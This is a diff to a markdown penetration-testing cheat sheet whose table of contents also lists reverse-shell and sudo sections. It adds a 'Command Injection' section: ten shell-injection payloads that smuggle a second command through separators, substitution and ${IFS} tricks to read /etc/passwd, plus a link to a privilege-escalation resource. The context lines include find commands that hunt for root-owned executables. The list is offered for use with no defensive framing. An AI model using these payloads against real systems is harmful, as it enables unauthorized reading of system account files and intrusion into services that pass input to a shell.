@@ -6,6 +6,7 @@
 - [Reverse Shell](#reverse-shell)
 - [SCP](#scp)
 - [Sudo](#sudo)
+- [Command Injection](command-injection)
 
 
 ## Sudo
@@ -97,3 +98,18 @@ find / -user user 2>&-
 find / -group group 2>&-
 find / -user root -executable -type f 2>&- | grep -v /bin/
 ```
+
+## Command Injection
+```bash
+;{cat,/etc/passwd}
+;cat${IFS}/etc/passwd;
+; cat /etc/passwd ;
+$(cat /etc/passwd)
+`cat /etc/passwd`
+&& cat /etc/passwd &&
+|| cat /etc/passwd ||
+< <(cat /etc/passwd)
+| cat /etc/passwd
+"; cat /etc/passwd "
+```
+[GTFOBins - Bypass  local security restrictions](https://gtfobins.github.io/)
